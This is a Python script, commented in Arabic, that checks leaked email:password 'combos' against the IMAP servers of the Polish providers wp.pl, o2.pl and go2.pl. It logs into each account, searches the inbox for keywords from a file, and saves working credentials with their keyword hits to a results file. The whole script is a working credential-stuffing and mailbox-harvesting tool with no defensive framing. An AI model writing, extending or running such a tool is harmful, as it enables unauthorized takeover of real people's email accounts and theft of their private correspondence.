import imaplib
import os
from colorama import init, Fore, Style

init(autoreset=True)

# خريطة السيرفرات المخصصة للدومينات المطلوبة
POLISH_IMAP_SERVERS = {
    'wp.pl': 'imap.wp.pl',
    'o2.pl': 'poczta.o2.pl',
    'go2.pl': 'poczta.o2.pl'
}

def load_keywords():
    if os.path.exists("keywords.txt"):
        with open("keywords.txt", "r", encoding="utf-8") as f:
            return [line.strip() for line in f if line.strip()]
    return []

def check_imap_account(email, password, keywords):
    domain = email.split('@')[1].lower()
    
    # التأكد أن الدومين ضمن الدومينات الثلاثة المطلوبة فقط
    if domain not in POLISH_IMAP_SERVERS:
        return 'skipped'
        
    imap_server = POLISH_IMAP_SERVERS[domain]
    
    try:
        # الاتصال بالسيرفر عبر SSL
        with imaplib.IMAP4_SSL(imap_server, timeout=10) as mail:
            mail.login(email, password)
            mail.select("inbox")
            
            found_keywords = {}
            for kw in keywords:
                status, data = mail.search(None, f'TEXT "{kw}"')
                if status == "OK" and data[0]:
                    count = len(data[0].split())
                    if count > 0:
                        found_keywords[kw] = count
            
            if found_keywords:
                return {'status': 'hit', 'keywords': found_keywords}
            else:
                return {'status': 'valid_no_keywords'}
    except Exception:
        return 'bad'

def main():
    print(Fore.CYAN + "=== Polish Domains IMAP Checker (wp.pl, o2.pl, go2.pl) ===" + Style.RESET_ALL)
    
    keywords = load_keywords()
    print(Fore.YELLOW + f"Loaded {len(keywords)} keywords from keywords.txt" + Style.RESET_ALL)
    
    if not os.path.exists("combos.txt"):
        print(Fore.RED + "Error: combos.txt not found!" + Style.RESET_ALL)
        return
        
    os.makedirs("Results", exist_ok=True)
    hit_file = open("Results/hits.txt", "a", encoding="utf-8")
    
    with open("combos.txt", "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if not line or ':' not in line:
                continue
                
            parts = line.split(':')
            email = parts[0].strip()
            password = ":".join(parts[1:]).strip()
            
            domain = email.split('@')[-1].lower()
            if domain not in POLISH_IMAP_SERVERS:
                continue # تخطي أي دومين آخر غير الـ 3 المطلوبين
                
            print(Fore.WHITE + f"Checking: {email}..." + Style.RESET_ALL, end=" ")
            result = check_imap_account(email, password, keywords)
            
            if isinstance(result, dict) and result['status'] == 'hit':
                print(Fore.GREEN + "[HIT]" + Style.RESET_ALL)
                hit_file.write(f"{email}:{password} | Hits: {result['keywords']}\n")
                hit_file.flush()
            elif result == 'valid_no_keywords':
                print(Fore.YELLOW + "[VALID (No Keywords)]" + Style.RESET_ALL)
            else:
                print(Fore.RED + "[BAD / Locked]" + Style.RESET_ALL)
                
    hit_file.close()
    print(Fore.GREEN + "\nFinished checking target domains!" + Style.RESET_ALL)

if __name__ == "__main__":
    main()
